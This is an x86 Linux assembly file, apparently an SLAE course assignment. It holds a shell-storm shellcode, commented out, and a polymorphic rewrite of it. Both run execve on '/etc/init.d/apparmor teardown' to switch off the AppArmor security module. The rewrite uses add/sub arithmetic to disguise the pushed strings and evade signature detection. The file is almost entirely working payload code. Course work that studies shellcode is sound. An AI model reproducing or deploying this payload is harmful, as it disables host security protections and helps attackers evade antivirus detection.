; SLAE-xxx
; apparmor teardown original
; by Name = John Babio Twitter = 3vi1john
; assignment 6.2: polymorphic version of shellstorm shellcode 

;push 0xb 
;pop eax
;xor edx,edx
;push edx
;push 0x6e776f64
;push 0x72616574
;mov ecx,esp
;push edx
;push   0x726f6d72
;push   0x61707061
;push   0x2f642e74
;push   0x696e692f
;push   0x6374652f
;mov ebx,esp 
;push edx 
;push ecx 
;push ebx 
;mov ecx,esp 
;int 0x80 

; this assembly is quite easy to understand 
; its standard execve calling /etc/init.d/apparmor teardown 
; lets modify it 

global _start: 

_start: 
xor eax,eax 
mov edx,eax 
mov al,0xb 
push edx
mov esi,0x5d665e53
add esi,0x11111111
push esi 
push 0x72616574
mov ecx,esp
push edx 
mov esi,0x83807e83
sub esi,0x11111111
push esi 
push 0x61707061
push 0x2f642e74
push word 0x696e
push word 0x692f
push word 0x6374
push word 0x652f
mov ebx,esp 
push edx 
push ecx 
push ebx
mov ecx,esp 
int 0x80 
